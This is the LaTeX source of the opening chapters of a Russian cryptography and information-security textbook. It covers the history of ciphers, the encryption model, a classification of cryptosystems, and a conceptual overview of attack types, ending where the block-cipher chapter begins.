\documentclass[10pt,a4paper]{book}
%\documentclass[12pt,report,russian]{ncc}
%\usepackage{a4wide}
\usepackage{cmap}                       % Поддержка поиска русских слов в PDF (pdflatex)
\usepackage{pscyr}
\usepackage[math]{pscyr} % PSCyr ЗАГРУЖАТЬ ПЕРЕД inputenc и babel!!!
%\usepackage[T1, T2A]{fontenc}
\usepackage[X2,T2A]{fontenc}
\usepackage[utf8]{inputenc}
\usepackage[english,russian]{babel}
\usepackage{indentfirst}                % Красная строка в первом абзаце
%\usepackage{misccorr}
%Может быть установлено 8pt, 9pt, 10pt, 11pt, 12pt, 14pt, 17pt, and 20pt
%\usepackage[12pt]{extsizes}
%\usepackage[mag=1000,a4paper,left=3cm,right=2cm,top=2cm,bottom=2cm,noheadfoot]{geometry}

\usepackage{amsfonts, amsmath, eucal, bm, amssymb, graphicx, color, mathabx}
\usepackage{algorithm, algorithmic}     % 'algorithm' environments
\floatname{algorithm}{Алгоритм}
\usepackage{multirow}                   % multirow cells in tables
\usepackage{arydshln}                   % dash lines in tables
\usepackage{subfig, float, wrapfig}     % sub figures
\usepackage{makeidx, caption}           % index, titles for figures
\usepackage{enumerate}
\usepackage{fancybox}                   % страница в рамке
%\usepackage{fancyhdr}                   % глава и секция вверху страницы
%\usepackage{layout}
\usepackage[left=1.84cm, right=1.5cm, paperwidth=14cm, top=1.8cm, bottom=2cm, height=19.8cm, paperheight=20cm]{geometry}

% поддержка гиперссылок; гиперссылки в pdf, должен быть последним загруженным пакетом
\ifx\pdfoutput\undefined
    \usepackage[unicode,dvips]{hyperref}
\else
    \usepackage[pdftex,colorlinks,unicode,bookmarks]{hyperref}
\fi

%\paperwidth=16.8cm \oddsidemargin=0cm \evensidemargin=0cm \hoffset=-0.33cm \textwidth=13.2cm
%\paperheight=24cm \voffset=-0.4cm \topmargin=0cm \headsep=0cm \headheight=0cm \textheight=19.8cm \footskip=0.9cm

% параметры PDF файла
\hypersetup{
    pdftitle={Защита информации},
    pdfauthor={Э. М. Габидулин, А. С. Кшевецкий, А. И. Колыбельников, С. М. Владимиров},
    pdfsubject=учебное пособие,
    pdfkeywords={защита информации, криптография, МФТИ}
}

% добавить точку после номера секции, раздела и т.д.
\makeatletter
\def\@seccntformat#1{\csname the#1\endcsname.\quad}
\def\numberline#1{\hb@xt@\@tempdima{#1\if&#1&\else.\fi\hfil}}
\makeatother

% перенос слов с тире
%\lccode`\-=`\-
%\defaulthyphenchar=127

% изменить подписи к рисункам, таблицам и т.д.
\captionsetup{labelsep=period}          % заменить : на .
\captionsetup{textformat=period}        % Подписи завершать точкой
%\captionsetup[table]{position=above}    % вертикальные отступы подписи таблицы для случая, когда подпись вверху
%\captionsetup[figure]{position=below}   % вертикальные отступы подписи рисунка для случая, когда подпись внизу

%% стиль главы и секции вверху страницы
%\pagestyle{fancy}
%%\renewcommand{\chaptermark}[1]{\markboth{#1}{}}
%\renewcommand{\sectionmark}[1]{\markright{#1}{}}
%
%%\fancyhf{}
%%\fancyfoot[СE,CO]{\thepage}
%%\fancyhead[LE]{\textsc{\nouppercase{\leftmark}}}
%\fancyhead[RO]{\textsc{\nouppercase{\rightmark}}}
%
%\fancypagestyle{plain}{ %
%\fancyhf{}                              % remove everything
%\renewcommand{\headrulewidth}{0pt}      % remove lines as well
%\renewcommand{\footrulewidth}{0pt}}

% запретить выходить за границы страницы
\sloppy

\newtheorem{theorem}{Теорема}[section]
\newtheorem{lemma}[theorem]{Лемма}
\newtheorem{definition}[theorem]{Определение}
\newtheorem{property}[theorem]{Утверждение}
\newtheorem{corollary}[theorem]{Следствие}
%\newtheorem{algorithm}[theorem]{Алгоритм}
\newtheorem{remark}[theorem]{Замечание}
\newcommand{\proof}{\noindent\textsc{Доказательство.\ }}

%\newtheorem{example}{\textsc{\textbf{Пример}}}
\newcommand{\example}{\textsc{\textbf{Пример.}} }
\newcommand{\exampleend}

\newcommand{\set}[1]{\mathbb{#1}}
\newcommand{\group}[1]{\mathbb{#1}}
\newcommand{\E}{\group{E}}
\newcommand{\F}{\group{F}}
\newcommand{\GF}[1]{\group{GF}(#1)}
\newcommand{\Gr}{\group{G}}
\newcommand{\R}{\group{R}}
\newcommand{\Z}{\group{Z}}
\newcommand{\MAC}{\textrm{MAC}}
\newcommand{\HMAC}{\textrm{HMAC}}
\newcommand{\PK}{\textrm{PK}}
\newcommand{\SK}{\textrm{SK}}

%Наконец, существует способ дублировать знаки операций, который мы приведем безо всяких пояснений. Включив
%\newcommand*{\hm}[1]{#1\nobreak\discretionary{}{\hbox{\mathsurround=0pt #1}}{}}
%в преамбулу, можно написать $a\hm+b\hm+c\hm+d$, при этом в формуле a\hm+b\hm+c\hm+d при переносе знак + будет продублирован.

% Дублирование символов бинарных операций ("+", "-", "="), набранных в строчных формулах, при переносе на другую строку:
%%begin{latexonly}
%\renewcommand\ne{\mathchar"3236\mathchar"303D\nobreak
%      \discretionary{}{\usefont
%      {OMS}{cmsy}{m}{n}\char"36\usefont
%      {OT1}{cmr}{m}{n}\char"3D}{}}
%\begingroup
%\catcode`\+\active\gdef+{\mathchar8235\nobreak\discretionary{}%
% {\usefont{OT1}{cmr}{m}{n}\char43}{}}
%\catcode`\-\active\gdef-{\mathchar8704\nobreak\discretionary{}%
% {\usefont{OMS}{cmsy}{m}{n}\char0}{}}
%\catcode`\=\active\gdef={\mathchar12349\nobreak\discretionary{}%
% {\usefont{OT1}{cmr}{m}{n}\char61}{}}
%\endgroup
%\def\cdot{\mathchar8705\nobreak\discretionary{}%
% {\usefont{OMS}{cmsy}{m}{n}\char1}{}}
%\def\times{\mathchar8706\nobreak\discretionary{}%
% {\usefont{OMS}{cmsy}{m}{n}\char2}{}}
%\mathcode`\==32768
%\mathcode`\+=32768
%\mathcode`\-=32768
%%end{latexonly}

\makeindex

\begin{document}

%\layout

% рамка границ страницы http://www.ctan.org/tex-archive/macros/latex/contrib/fancybox/fancybox-doc.pdf
% сделать поиск по fancypage, thisfancypage
%\thisfancypage{}{\fbox}
%\thisfancypage{\fbox}{}
%\fancypage{}{\fbox}         % закомментировать
%\fancypage{\fbox}{\fbox}    % закомментировать
%\fancypage{\setlength{\fboxsep}{32pt}\fbox}{}

\title{Защита информации \\ Учебное пособие}
\author{Габидулин Эрнст Мухамедович \\ Кшевецкий Александр Сергеевич \\ Колыбельников Александр Иванович \\ Владимиров Сергей Михайлович}
\date{
 %   \textbf{\textsc{Черновой вариант. Может содержать ошибки.}} \\
%    \today
}
\maketitle
\setcounter{page}{3}

\newpage
%\thispagestyle{empty}
\setcounter{tocdepth}{2}
\tableofcontents
%\thispagestyle{empty}
\newpage

%\lhead[\leftmark]{}
%\rhead[]{\rightmark}

\chapter{Предисловие}
\selectlanguage{russian}

Изучение курса <<Защита информации>> необходимо начать с определения понятия \emph{информация}. В теоретической информатике \textbf{информация} -- это любые сведения, или цифровые данные, или сообщения, или документы, или файлы, которые могут быть переданы \emph{получателю информации} от \emph{источника информации}. Можно считать, что информация передается по какому-либо каналу связи с помощью некоторого носителя, которым может быть, например, распечатка текста, диск или другое устройство хранения информации, система передачи сигналов по оптическим, проводным или радио линиям связи и т. д.

\textbf{Защита информации} -- это сохранение \emph{целостности}, \emph{конфиденциальности} и \emph{доступности} информации, передаваемой или хранимой в какой-либо форме. Информацию необходимо защищать от разрушения ее целостности и конфиденциальности в результате вмешательства \emph{нелегального пользователя}.

\textbf{Целостность информации}\index{целостность} -- это сохранность информации (в любой ее форме представления) в неизменном (оригинальном) виде. \textbf{Конфиденциальность}\index{конфиденциальность} означает, что информация получена именно тем, кому она предназначалась, то есть \textbf{легальным пользователем}, и никто другой, то есть \emph{нелегальный пользователь}, эту информацию не получил.

\textbf{Доступность}\index{доступность} -- свойство информации быть доступной легальным пользователям в любой момент времени.

Чтобы реализовать защиту информации, используются различные математические методы, технические средства и организационные меры. В частности, источник информации (на передающей стороне) применяет \textbf{шифрование}, а легальный пользователь (на приемной стороне) осуществляет \textbf{расшифрование}\index{расшифрование}. Процесс получения информации нелегальным пользователем называется \textbf{дешифрованием}\index{дешифрование}\footnote{В англоязычной литературе словом <<decryption>> обозначается и расшифрование, и дешифрование.}, а сам нелегальный пользователь -- \textbf{криптоаналитиком}\index{криптоаналитик}.

В настоящем пособии рассмотрены только основные математические методы защиты информации, и среди них основной акцент сделан на криптографическую защиту, которая включает симметричные и несимметричные методы шифрования, формирование секретных ключей, протоколы ограничения доступа и аутентификации сообщений и пользователей. Кроме того, в пособии рассматриваются типовые уязвимости операционных и информационно-вычислительных систем.

\section*{Благодарности}
Авторы пособия благодарят студентов, аспирантов и сотрудников института, которые помогли с подготовкой, редактированием и поиском ошибок в тексте:

\begin{itemize}
	\item Дмитрий Банков (201-011 гр.)
	\item Даниил Бершацкий (201-012 гр.)
	\item Дмитрий Бородий (201-112 гр.)
	\item Дмитрий Вербицкий (201-119 гр.)
	\item Марат Гаджибутаев (201-018 гр.)
	\item Евгений Глушков (201-012 гр.)
	\item Сергей Жестков (201-013 гр.)
	\item Марат Ибрагимов (201-114 гр.)
	\item Александр Иванов (201-011 гр.)
	\item Александр Иванов (201-019 гр.)
	\item Константин Ковальков (201-015 гр.)
	\item Виталий Крепак (201-013 гр.)
	\item Александр Кротов (201-011 гр.)
	\item Станислав Круглик (201-111 гр.)
	\item Милосердов Олег (201-016 гр.)
	\item Хыу Чунг Нгуен (201-015 гр.)
	\item Артём Никитин (201-012 гр.)
	\item Андрей Пунь (201-013 гр.)
	\item Иван Саюшев (201-112 гр.)
	\item Игорь Сорокин (201-112 гр.)
	\item Буй Зуи Тан (201-112 гр.)
	\item Евгений Юлюгин (201-916 гр.)
\end{itemize}


\chapter{Основные понятия и определения}

\section{Краткая история криптографии}

Вслед за возникновением письменности появилась задача обеспечения секретности и подлинности передаваемых сообщений путем так называемой тайнописи. Поскольку государства возникали почти одновременно с письменностью, дипломатия и военное управление требовали секретности.

Данные о первых способах тайнописи весьма обрывочны. Предполагается, что тайнопись была известна в древнем Египте и Вавилоне. До нашего времени дошли литературные свидетельства того, что секретное письмо использовалось в древней Греции. Наиболее известен метод шифрования, который использовался Гаем Юлием Цезарем (100--44~гг.~до~н.э.).

Первое известное исследование по анализу стойкости методов шифрования было сделано в <<Манускрипте о дешифровании криптографических сообщений>> Абу Аль-Кинди (801–-873~гг.~н.э.). Он показал, что моноалфавитные шифры, в которых каждому символу кодируемого текста ставится в однозначное соответствие какой-то другой символ алфавита, легко поддаются частотному криптоанализу. Абу Аль-Кинди был так же знаком с более сложными полиалфавитными шифрами.

В европейских странах полиалфавитные шифры были открыты в эпоху Возрождения. Итальянский архитектор Баттиста Альберти (1404--1472) изобрел полиалфавитный шифр, который, впоследствии получил имя дипломата XVI века Блеза де Виженера. В истории развития полиалфавитных шифров до XX века также наиболее известны немецкий аббат XVI века Иоганн Трисемус и английский ученый начала XIX века Чарльз Витстон. Витстон изобрел простой и стойкий способ полиалфавитной замены, называемый шифром Плейфера по имени лорда Плейфера, способствовавшему внедрению шифра. Шифр Плейфера использовался вплоть до Первой мировой войны.

Прообразом современных шифров для электронно-вычислительных машин стали так называемые роторные машины XX века, которые позволяли создавать и реализовывать устойчивые к взлому полиалфавитные шифры. Примером такой машины является немецкая машина \emph{Enigma}\index{Enigma}, разработанная в конце Первой мировой войны. Период активного применения Enigma пришелся на Вторую мировую войну.

Появление в середине XX столетия первых ЭВМ кардинально изменило ситуацию. Вычислительные способности компьютеров подняли на совершенно новый уровень как возможности реализации шифров, недоступных ранее из-за их высокой сложности, так и возможности криптоаналитиков по их взлому. Следствием этого факта стало разделение шифров по области применения.

В 1976 году появился шифр DES (Data Encryption Standard), который был принят как стандарт США. DES широко использовался для шифрования пакетов данных при передаче в компьютерных сетях и системах хранения данных. С 90-х годов параллельно с традиционными шифрами, основой которых была булева алгебра, активно развиваются шифры, основанные на операциях в конечном поле. Широкое распространение персональных компьютеров и быстрый рост объема передаваемых данных в компьютерных сетях, привело к замене в 2002 году стандарта DES на более стойкий и быстрый в программной реализации стандарт -- шифр AES (Advanced Encryption Standard). Окончательно, DES был выведен из эксплуатации как стандарт в 2005 году.

В беспроводных голосовых сетях передачи данных используются шифры с малой задержкой шифрования и расшифрования на основе посимвольных преобразований -- так называемые \emph{потоковые шифры}.

%Основным их преимуществом является сочетание помехоустойчивого кодирования с криптостойкостью шифра.

Параллельно с разработкой быстрых шифров в 1977 г. появился новый класс криптосистем, так называемые \emph{криптосистемы с открытым ключом}. Хотя эти новые криптосистемы намного медленнее (технически сложнее) симметричных, они открыли принципиально новые возможности --  \emph{электронная подпись}, \emph{аутентификация} и \emph{сертификация} составили основу современной защищенной связи в интернете.

В настоящее время типичное использование криптографии в информационных системах состоит в:
\begin{itemize}
\item цифровой аутентификации пользователей с помощью криптосистем с открытым ключом,
\item создании кратковременных сеансовых ключей и
\item применении быстрых шифров в процессах обмена данными.
\end{itemize}


\section{Модель системы передачи с криптозащитой}
\selectlanguage{russian}

Простая модель системы передачи с криптозащитой представлена на рис. \ref{pic:Encrypt}, где введены следующие обозначения:
\begin{itemize}
    \item $A$ -- источник информации;
    \item $B$ -- получатель информации, легальный пользователь;
    \item $X$ -- сообщение до шифрования или \textbf{открытый текст}\index{открытый текст} (plaintext); $\set{M}$ -- множество всех возможных открытых текстов (от слова Message), $X \in \set{M}$;
    \item $K_1$ -- ключ шифрования\index{ключ!шифрования}; $\set{K}_E$ -- множество всех возможных ключей шифрования  (от слов Key и Encryption), $K_1 \in \set{K}_E$;
    \item $Y$ -- шифрованное сообщение (или \textbf{шифротекст}\index{шифротекст}, или \textbf{шифрограмма}\index{шифрограмма}); $\set{C}$ -- множество всех возможных шифротекстов (от термина Cipher text), $Y \in \set{C}$;
    \item $K_2$ -- ключ расшифрования\index{ключ!расшифрования}; $\set{K}_D$  -- множество возможных ключей расшифрования  (от слов Key и Decryption), зависящее от множества $\set{K}_E$, $K_2 \in \set{K}_D$.
\end{itemize}

\begin{figure}[!ht]
	\centering
	\includegraphics[width=1.0\textwidth]{pic/scheme-of-cipher}
	\caption{Передача информации с криптозащитой\label{pic:Encrypt}}
\end{figure}

\textbf{Шифр}\index{шифр} -- это множество обратимых функций отображения $E_{K_1}$\index{функция!шифрования} множества открытых текстов $\set{M}$ на множество шифротекстов $\set{C}$, зависящих от выбранного ключа шифрования $K_1$ из множества $\set{K}_E$:
%обратимое отображение пары из элемента множества открытых текстов $\set{M}$ и элемента множества ключей шифрования $\set{K}_E$ в множество шифротекстов $\set{C}$:
\begin{equation}
    \label{eq:Encryption}
    Y = E_{K_1}(X), ~ X \in \set{M}, ~ K_1 \in \set{K}_E, ~ Y \in \set{C}.
\end{equation}
Можно сказать, что шифрование -- это обратимая функция двух аргументов: сообщения и ключа. Для каждого $K_1$ эта функция должна быть обратимой. Обратимость -- основное условие шифрования, по которому каждому зашифрованному сообщению $Y$ и ключу $K$ соответствует одно исходное сообщение $X$. Легальный пользователь $B$ (на приемной стороне системы связи)  получает сообщение $Y$ и осуществляет процедуру \textbf{расшифрования}\index{расшифрование}.
Следует отличать шифрование от кодирования, кодирование - это процесс сопоставления конкретным сообщениям строго определенной комбинации символов или сигналов, с целью повышения помехоустойчивости передаваемого сигнала.
Расшифрование --  это отображение множества шифротекстов $\set{C}$ в множество открытых текстов $\set{M}$ функцией $D_{K_2}$\index{функция!расшифрования}, зависящей от ключа расшифрования $K_2$ из множества $\set{K}_D$, являющейся обратной к функции $E_{K_1}$.
\begin{equation}
    \label{eq:Decryption}
    D_{K_2}(Y) = X, ~ Y \in \set{C}, ~ K_2 \in \set{K}_D, ~ X \in \set{M}.
\end{equation}

%Система передачи информации с криптозащитой называется \textbf{криптосистемой}\index{криптосистема}.(?????)

%В общем случае функция шифрования сюръективна и псевдослучайна, отображая один открытый текст в разные шифротексты. Если функция шифрования биективна, на практике ее инкапсулируют в другую функцию с целью добиться псевдослучайности шифрования одинаковых открытых текстов в разные шифротексты.

%Методы защиты информации зависят от возможных сценариев передачи. Рассмотрим несколько основных вариантов.
Рассмотрим возможные сценарии вмешательства криптоаналитика и организации защиты информации от его действий.
Пусть  $A$ --  источник и $B$ -- получатель сообщений.

\begin{description}
    \item[Сценарий 1.] Пусть $E$ -- \textbf{пассивный} криптоаналитик\index{криптоаналитик!пассивный}, который может подслушивать передачу, но не может вмешиваться в процесс передачи. Из пассивности криптоаналитика следует, что $Y = \widetilde{Y}$ и \textbf{целостность} информации обеспечена.

Цель защиты --- \textbf{обеспечение конфиденциальности}.

Средства защиты -- шифрование с помощью \emph{симметричных} или \emph{асимметричных } криптосистем.

Дополнительные задачи -- при большом числе пользователей должна быть решена задача \textbf{генерации и доставки секретных ключей} всем пользователям.

    \item[Сценарий 2.] Пусть $E$ -- \textbf{активный} криптоаналитик\index{криптоаналитик!активный}, который может изменять, удалять и вставлять сообщения или их части.

    Цель защиты -- \textbf{обеспечение конфиденциальности} и  \textbf{обеспечение целостности}.

Средства защиты --  шифрование и добавление \emph{имитовставки}\index{имитовставка} (Message Authentication Code -- $\MAC$), позволяющего обнаружить нарушение целостности.

    \item[Сценарий 3.] Пусть $E$ -- активный криптоаналитик, который может изменять, удалять и вставлять сообщения или их части), дополнительно к этому легальные пользователи $A$ и $B$ не доверяют друг другу.

Цель защиты -- \textbf{аутентификация }пользователей и документов.

Средства -- \emph{электронная подпись} и протокол идентификации (аутентификации) пользователей.
\end{description}

%%Возможно вмешательство нелегального пользователя $E$, называемого \textbf{криптоаналитиком}.
%%
%%
%%Если $X = \widetilde{X}$, то вмешательство криптоаналитика  $E$ не изменило передаваемое сообщение, и \textbf{целостность} информации обеспечена. Если криптоаналитик не получил информацию, содержащуюся в сообщении, то обеспечена \textbf{конфиденциальность}.
%%
%%Если в этой системе возможна двусторонняя передача, то есть от $A$ к $B$ и от $B$ к $A$, то говорят о взаимном обмене информацией между легальными пользователями.
%
%Секретность информации в современных шифрах обеспечивается секретным ключом, в то время как сам алгоритм криптосистемы является общеизвестным. Исторический опыт, например, система шифрования A5/1 в GSM, показывает, что секретность алгоритма шифрования \emph{ослабляет} криптостойкость шифра, а не увеличивает, из-за того, что система становится малоизученной.


\section{Классификация криптосистем}

\subsection{Симметричные и асимметричные криптосистемы}
\selectlanguage{russian}

Криптографические системы и шифры можно разделить на две больших группы, в зависимости от принципа использования ключей для шифрования и расшифрования.

Если для шифрования и расшифрования используется один и тот же ключ $K$, либо если получение ключа расшифрования $K_2$ из ключа шифрования $K_1$ является тривиальной операцией, то такая криптосистема называется \textbf{симметричной}\index{криптосистема!симметричная}. В зависимости от объёма обработки данных за одну операцию шифрования симметричные шифры делятся на \textbf{блочные}\index{шифр!блочный}, в которых за одну операцию шифрования происходит преобразование одного блока данных (32 бита, 64, 128 или больше) и \textbf{потоковые}\index{шифр!потоковый}, в которых работают с каждым символом открытого текста по отдельности (например, с 1 битом или 1 байтом). Примеры блочных шифров рассмотрены в главе~\ref{chapter-block-ciphers}, а потоковых -- в главе~\ref{chapter-stream-ciphers}.

Шифрование блочным шифром подразумевает разделение открытого текста на блоки одинаковой длины. Блоки шифруются последовательно, причём результат шифрования следующего блока может зависеть от предыдущего. Это регулируется \textbf{режимом сцепления блоков}. Примеры нескольких таких режимов рассмотрены в разделе~\ref{chapter-block-chaining}.

Если ключ расшифрования получить из ключа шифрования сложно (или невозможно), то такие криптосистемы называют криптосистемами \textbf{с открытым ключом}\index{криптосистема!с открытым ключом} или \textbf{асимметричными} криптосистемами\index{криптосистема!асимметричная}. Некоторые из них рассмотрены в главе~\ref{chapter-public-key}. Все используемые на сегодняшний день асимметричные криптосистемы работают с блоком данных открытого текста, представленным в виде числа длиной в несколько сот или тысяч бит, поэтому классификация таких систем по объёму обрабатываемых за одну операцию данных не производится.

Алгоритм, который выполняет отображение аргумента произвольной длины в значение фиксированной длины, называется \textbf{хеш-функцией}. Если для такой хеш-функции выполняются определённые свойства устойчивости к поиску коллизий, то это уже \textbf{криптографическая хеш-функция}. Такие функции рассмотрены в главе~\ref{chapter-hash-functions}. Криптографические хеш-функции используются для проверки целостности сообщений. Для проверки с использованием общего секретного ключа отправителя и получателя используется механизм \textbf{имитовставки}, рассмотренный в разделе~\ref{section-MAC}. Её аналогом в криптосистемах с открытым ключом является \textbf{электронная подпись}, алгоритмы генерации и проверки которой рассмотрены в главе~\ref{chapter-public-key}, вместе с алгоритмами асимметричного шифрования.

\subsection{Шифры замены и перестановки}

По способу преобразования открытого текста в шифрованный текст шифры разделяются на шифры замены и шифры перестановки.

\subsubsection{Шифры замены}
\selectlanguage{russian}

В шифрах \textbf{замены} символы одного алфавита заменяются символами другого алфавита обратимым преобразованием. В последовательности открытого текста символы входного алфавита заменяются на символы выходного алфавита. Такие шифры применяются как в симметричных системах, так и в асимметричных криптосистемах. Если при преобразовании используются однозначные функции, то шифры замены называются однозначными шифрами замены. Если используются многозначные функции, то шифры называются многозначными шифрами замены (омофонами).

В \textbf{омофоне}\index{омофон} символам входного алфавита ставится в соответствие непересекающиеся подмножества символов выходного алфавита. Количество символов в каждом подмножестве замены пропорционально частоте встречаемости символа открытого текста. Таким образом, омофон создает равномерное распределение символов шифротекста, и прямой частотный криптоанализ невозможен. При шифровании омофонами символ входного алфавита заменяется на случайно выбранный из подмножества замены.

Шифры бывают \textbf{моноалфавитные}, когда для шифрования используется одно отображение входного алфавита в выходной алфавит. Если алфавит на входе и выходе одинаков, и его размер (число символов) равен $D$, тогда количество всевозможных моноалфавитных шифров замены такого типа равно $D!$.

\textbf{Полиалфавитный} шифр задается множеством различных вариантов отображения входного алфавита на выходной алфавит. Шифры замены могут быть как потоковыми, так и блоковыми. Однозначный полиалфавитный потоковый шифр замены называется \textbf{шифром гаммирования}\index{шифр!гаммирования}. Символом алфавита может быть, например, 256-битовое слово, а размер алфавита -- $2^{256}$, соответственно.


\input{permutation_ciphers}

\input{composite_chiphers}

\subsection{Примеры современных криптопримитивов}

Приведем примеры названий некоторых современных криптографических примитивов, из которых строят системы защиты информации:
\begin{itemize}
    \item DES, AES, ГОСТ 28147-89, Blowfish, RC5, RC6 -- блоковые симметричные шифры, скорость обработки -- десятки мегабайт в секунду,
    \item A5/1, A5/2, A5/3, RC4 -- потоковые симметричные шифры с высокой скоростью, семейство A5 применяется в мобильной связи GSM, RC4 -- в компьютерных сетях для SSL соединения между браузером и вебсервером,
    \item RSA\index{криптосистема!RSA} -- криптосистема с открытым ключом для шифрования,
    \item RSA\index{криптосистема!RSA}, DSA, ГОСТ Р 34.10-2001 -- криптосистемы с открытым ключом для электронной подписи,
    \item MD5, SHA-1, SHA-2, ГОСТ Р 34.11-94 -- криптографические хэш-функции.
\end{itemize}

\section{Методы криптоанализа и типы атак}
\selectlanguage{russian}

Нелегальный пользователь-криптоаналитик получает информацию путем дешифрования. Сложность этой процедуры определяется числом стандартных операций, которые надо выполнить для достижения цели. \textbf{Двоичной сложностью}\index{сложность!двоичная} (или битовой сложностью) алгоритма называется количество двоичных операций, которые необходимо выполнить для его завершения.
% Наиболее сложным является дешифрование полиалфавитных шифров.

Попытка криптоаналитика $E$ получить информацию называется \textbf{атакой} или криптоатакой\index{атака}. Как правило, легальным пользователям нужно обеспечить защиту информации на протяжении от нескольких дней до 100 лет. Если попытка атаки оказалась удачной для нелегального пользователя $E$ и информация получена или может быть получена в ближайшем будущем, то такое событие называется  \textbf{взломом криптосистемы}\index{взлом криптосистемы} или \textbf{вскрытием криптосистемы}. Метод вскрытия криптосистемы называется \textbf{криптоанализом}\index{криптоанализ}. Криптосистема называется \textbf{криптостойкой}\index{криптостойкость}, если число стандартных операций для ее взлома превышает возможности современных вычислительных средств в течение всего времени ценности информации (до 100 лет).

В общем случае, в криптоанализе под \textbf{взломом} криптосистемы понимается построение алгоритма криптоатаки для получения доступа к информации с количеством операций, меньшим, чем планировалось при создании этой криптосистемы. Взлом криптосистемы -- это не обязательно реально осуществленное извлечение информации, так как количество операций для извлечения информации может быть вычислительно недостижимым в настоящее время, а также в течение всего времени защиты.
%, но предполагается достижимым в будущем.

Рассмотрим основные сценарии работы криптоаналитика $E$. В первом сценарии криптоаналитик может осуществлять подслушивание и (или) перехват сообщений. Его вмешательство не нарушает целостности информации: $Y=\widetilde{Y}$. Эта роль криптоаналитика называется \textbf{пассивной}. Так как он получает доступ к информации, то здесь нарушается конфиденциальность.

Во втором сценарии роль криптоаналитика \textbf{активная}. Он может подслушивать, перехватывать сообщения и преобразовывать их по своему усмотрению: задерживать, искажать с помощью перестановок пакетов, устраивать обрыв связи, создавать новые сообщения и т.п. Так что в этом случае выполняется условие $Y \neq \widetilde{Y}$. Это значит, что одновременно нарушается целостность и конфиденциальность передаваемой информации.

Приведем примеры пассивных и активных атак.
\begin{itemize}
    \item Атака <<\textbf{человек посередине}>>\index{атака!человек посередине} (man-in-the-middle) подразумевает криптоаналитика, который разрывает канал связи, встраиваясь между $A$ и $B$, получает сообщения от $A$ и от $B$, а от себя отправляет новые, фальсифицированные сообщения. В результате $A$ и $B$ не замечают, что общаются с $E$, а не друг с другом.
    \item Атака \textbf{воспроизведения}\index{атака!воспроизведения} (replay attack) -- когда криптоаналитик может записывать и в будущем воспроизводить шифротексты, имитируя легального пользователя.
    \item Атака на \textbf{различение} сообщений\index{атака!на различение} означает, что криптоаналитик, наблюдая одинаковые шифротексты, может извлечь информацию об идентичности исходных открытых текстов.
    \item Атака на \textbf{расширение} сообщений\index{атака!на расширение} означает, что криптоаналитик может дополнить шифротекст осмысленной информацией без знания секретного ключа.
    \item \textbf{Фальсификация} шифротекстов\index{атака!фальсификацией} криптоаналитиком без знания секретного ключа.
\end{itemize}

Часто для нахождения секретного ключа криптоатаки строят в предположениях о доступности дополнительной информации. Приведем примеры.
\begin{itemize}
    \item Атака на основе известного открытого текста\index{атака!с известным открытым текстом} (CPA, chosen plaintext attack) предполагает возможность криптоаналитику выбирать открытый текст и получать для него соответствующий шифротекст.
    \item Атака на основе известного шифротекста\index{атака!с известным шифротекстом} (CCA, chosen ciphertext attack) предполагает возможность криптоаналитику выбирать шифротекст и получать для него соответствующий открытый текст.
\end{itemize}

Обязательным требованием к современным криптосистемам является устойчивость ко всем известным типам атак -- пассивным, активным и с дополнительной информацией.


%Приведем примеры возможных вариантов работы активного криптоаналитика.
%\begin{itemize}
%\item Криптоаналитик имеет $m$ шифрованных сообщений $Y_{1},Y_{2},\ldots Y_{m}$ и пытается определить ключ или прочитать открытый текст $X_{1},X_{2},\ldots X_{m}.$
%\item Криптоаналитик имеет несколько пар открытого и шифрованного текстов
%
%$(Y_{1},X_{1}),(Y_{2}X_{2}),\ldots (Y_{m}X_{m})$ и пытается дешифровать остальной текст или определить алгоритм шифрования или определить ключ.
%\item
%\item
%\item
%\end{itemize}

Для защиты информации от активного криптоаналитика и обеспечения целостности дополнительно шифрованию сообщений применяют имитовставку\index{имитовставка}. Для неё используют обозначение $\MAC$ (message authentication code). Как правило, $\MAC$ строится на основе хэш-функций, которые будут описаны далее.

Существуют ситуации, когда пользователи $A$ и $B$ не доверяют друг другу. Например, $A$ -- банк, $B$ -- получатель денег. $A$ утверждает, что деньги переведены, $B$ утверждает, что не переведены. Решение задачи аутентификации и неотрицаемости состоит в обеспечении \textbf{электронной подписью}\index{электроннонная подпись, ЭП} каждого из абонентов. Предварительно надо решить задачу о генерировании и распределении секретных ключей.

В общем случае системы защиты информации должны обеспечивать:
\begin{itemize}
    \item конфиденциальность (защита от наблюдения),
    \item целостность (защита от изменения),
    \item аутентификацию (защита от фальсификации пользователя и сообщений),
    \item доказательство авторства информации (доказательство авторства и защита от его отрицания)
\end{itemize}
как со стороны получателя, так и со стороны отправителя.

Важным критерием для выбора степени защиты является сравнение стоимости реализации взлома для получения информации и экономического эффекта от ее владения. Очевидно, что если стоимость взлома превышает ценность информации, взлом нецелесообразен.

%Сценарии защиты информации
%   Сценарий 1. A -- передающая сторона. B -- принимающая сторона. E -- пассивный
%криптоаналитик, который может подслушивать передачу, но не может вмешиваться
%в процесс передачи. Цель защиты: обеспечение конфиденциальности. Средства
%-- методы шифрования с секретным ключом (симметричные системы шифрования)
%и методы шифрования с открытым ключом (асимметричные системы шифрования).
%Сценарий 2. E -- активный криптоаналитик, который может изменять, удалять и вставлять
%сообщения или их части. Цель защиты -- обеспечение конфиденциальности (не
%всегда) и обеспечение целостности. Средства -- методы шифрования и добавление
%имитовставки\index{имитовставка} (Message Autentication Code -- $\MAC$).
%Сценарий 3. A и B не доверяют друг другу. Цель защиты -- аутентификация пользователя.
%Средства -- электронная подпись.


\input{The_minimum_key_lengths}

\chapter{Классические шифры}

В главе приведены наиболее известные \emph{классические} шифры, которыми можно было пользоваться до появления роторных машин. К ним относятся шифр Цезаря, шифр Плейфера--Витстона, шифр Хилла, шифр Виженера. Они очень наглядно демонстрируют различные классы шифров.

\input{monoalphabetic_ciphers}

\input{bigrammnye_substitution_ciphers}

\input{hills_cipher}

% \subsection{Омофонные замены}
%
% Омофонными заменами называют криптопримитивы, в основе которых лежит замена групп символов открытого текста $M$ на группу символов $C$ с использованием ключа $K$. Такой метод шифрования вносит неоднозначность между $M$ и $C$, это позволяет защититься от методов частотного криптоанализа.
%  \subsection{шифрокоды}
%  Шифрокоды - это класс шифров сочетающих в себе свойства кодов и помехозащищенности со свойствами шифра и обеспечения конфиденциальности.

\input{vigeneres_chipher}

\input{polyalphabetic_cipher_cryptanalysis}

\input{perfect_secure_systems}

\chapter{Блоковые шифры}\label{chapter-block-ciphers}

\section{Ячейка Фейстеля}
\selectlanguage{russian}

